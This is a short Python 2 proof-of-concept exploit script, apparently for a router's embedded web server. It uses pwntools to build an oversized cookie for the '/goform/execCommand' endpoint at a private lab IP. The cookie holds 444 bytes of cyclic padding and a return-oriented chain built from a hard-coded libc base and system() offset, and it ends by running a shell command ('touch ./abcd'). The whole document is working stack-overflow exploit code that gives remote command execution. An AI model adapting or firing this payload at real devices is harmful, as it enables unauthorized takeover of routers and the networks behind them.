#!/usr/bin/python
#coding:utf-8
from pwn import *
import requests                                         
libc_base= 0x43510000
system_offset = 0x0005a270
system_addr= libc_base + system_offset
ip = "192.168.66.132"
url = "http://%s/goform/execCommand"%ip
cookie = {"Cookir":"password="+cyclic(444) + ".gif" + flat(libc_base + 0x00018298, system_addr, libc_base + 0x00040cb8)+ "touch ./abcd" }
ret = requests.get(url=url,cookies=cookie)
print ret.text
